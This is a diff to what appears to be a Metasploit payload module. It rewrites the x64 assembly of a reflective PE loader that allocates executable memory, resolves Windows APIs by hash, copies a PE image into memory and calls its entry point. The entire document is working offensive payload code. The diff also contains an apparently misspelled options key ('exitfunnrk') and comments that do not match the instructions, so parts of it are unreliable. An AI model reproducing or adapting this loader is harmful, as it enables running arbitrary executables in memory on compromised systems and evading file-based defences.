@@ -6,7 +6,17 @@ require 'msf/core/payload/windows/x64/block_api'
 module Msf
   module Payload::Windows::ReflectivePELoader_x64
     include Payload::Windows::BlockApi_x64
-    def asm_reflective_pe_loader_x64
+    def asm_reflective_pe_loader_x64(opts)
+
+      prologue = ''
+      if opts[:is_dll] == true
+        prologue = %(
+  mov rcx,0x00
+  mov rdx,0x01
+  mov r8,r13
+      )
+      end
+
       %^
 stub:
 	cld                             ; Clear direction flags
@@ -24,7 +34,7 @@ start:                            ;
 	mov r8d,0x00103000              ; MEM_COMMIT | MEM_TOP_DOWN | MEM_RESERVE
 	mov rdx,[rsp]                   ; dwSize
 	xor rcx,rcx                     ; lpAddress
-	mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}             ; hash( "kernel32.dll", "VirtualAlloc" )
+	mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
 	call rbp                        ; VirtualAlloc(lpAddress,dwSize,MEM_COMMIT|MEM_TOP_DOWN|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	add rsp,0x20                    ; Clear stack
 	mov rdi,rax                     ; Save the new base address to rdi
@@ -94,9 +104,10 @@ resolve:
 	cmp dword [rax],0x00            ; Check if end of the import names table
 	jz all_resolved                 ; If yes resolving process is done
 	mov rax,[rax]                   ; Get the RVA of function hint to eax
-	cmp eax,0x80000000              ; Check if the high order bit is set
-	js name_resolve                 ; If high order bit is not set resolve with INT entry
-	sub eax,0x80000000              ; Zero out the high bit
+	btr rax,63                      ; Check if the high order bit is set
+	jnc name_resolve                ; If high order bit is not set resolve with INT entry
+	shl rax,2                       ; Discard the high bit by shifting
+  shr rax,2                       ; Shift back the original value
 	call GetProcAddress             ; Get the API address with hint
 	jmp insert_iat                  ; Insert the address of API tı IAT
 name_resolve:
@@ -115,7 +126,7 @@ all_resolved:
 LoadLibraryA:
 	push rcx                        ; Save ecx to stack
 	mov rcx,rax                     ; Move the address of library name string to RCX
-	mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}             ; ror13( "kernel32.dll", "LoadLibraryA" )
+	mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
 	call rbp                        ; LoadLibraryA([esp+4])
 	add rsp,32                      ; Fix the stack
 	pop rcx                         ; Retrieve ecx
@@ -123,15 +134,17 @@ LoadLibraryA:
 GetProcAddress:
 	mov rcx,r13                     ; Move the module handle to RCX as first parameter
 	mov rdx,rax                     ; Move the address of function name string to RDX as second parameter
-	mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'GetProcAddress')}             ; ror13( "kernel32.dll", "GetProcAddress" )
+	mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'GetProcAddress')}
 	call rbp                        ; GetProcAddress(ebx,[esp+4])
 	add rsp,24                      ; Fix the stack
 	pop rcx                         ; ...
 	ret                             ; <-
 complete:
 	pop rax                         ; Clean out the stack
-	pop rcx                         ; Pop the image_size into RCX
-	mov r13,rdi                     ; Copy the new base value to rbx
+	pop rcx                         ; Pop the ImageSize into RCX
+  push rcx                        ; Save ImageSize to stack
+  push rdi                        ; Save ImageBase to stack
+	mov r13,rdi                     ; Copy the new base value to r13
 	add r13,r12                     ; Add the address of entry value to new base address
 memcpy:
 	mov al,[rsi]                    ; Move 1 byte of PE image to AL register
@@ -139,20 +152,32 @@ memcpy:
 	inc rsi                         ; Increase PE image index
 	inc rdi                         ; Increase image base index
 	loop memcpy                     ; Loop until zero
-CreateThread:
-	xor rax,rax                     ; Zero out the eax
-	push rax                        ; lpThreadId
-	push rax                        ; dwCreationFlags
-	mov r9,rax                      ; lpParameter
-	mov r8,r13                      ; lpStartAddress
- 	mov rdx,rax                     ; dwStackSize
-	mov rcx,rax                     ; lpThreadAttributes
-	mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'CreateThread')}             ; ror13( "kernel32.dll","CreateThread" )
-	call rbp                        ; CreateThread( NULL, 0, &threadstart, NULL, 0, NULL );
-  jmp end                         ; <-
-end:
-	nop                             ; Chill ;)
-	jmp end                         ; Loop !
+PE_start:
+  or rcx,-1                       ; hProcess
+  xor rdx,rdx                     ; lpBaseAddress
+  xor r8,r8                       ; hProcess
+  mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'FlushInstructionCache')}
+  call api_call                   ; FlushInstructionCache(0xffffffff,NULL,NULL);
+  add rsp,16                      ; Clean stack
+  mov r9,r13                      ; Set AOE to R9
+  mov rdx,r13                     ; Set AOE to RDX
+  pop r13                         ; Set R8 to ImageBase
+  mov rax,0x0000010800000000      ; Nessessary buffer space for process creation
+  push rax                        ; Put to stack
+  mov rax,0xffffffffffffffff      ; Tamper space
+  push rax                        ; Put to stack
+  lea rcx,[rsp+8]                 ; Get nessasary buffer address
+  push 0x00                       ; Put empty stack param
+  push 0x00                       ; Put empty stack param
+  push 0x00                       ; Put empty stack param
+  push 0x00                       ; Put empty stack param
+  push 0x00                       ; Put empty stack param
+  push 0x00                       ; Put empty stack param
+  #{prologue}
+  call r9                         ; Call the AOE
+  mov rcx,0x00                    ; dwExitCode
+  mov r10d,#{'0x%.8x' % Msf::Payload::Windows.exit_types[opts[:exitfunnrk]]}
+  call api_call                   ; Call exit funk based on exit_type
       ^
     end
   end
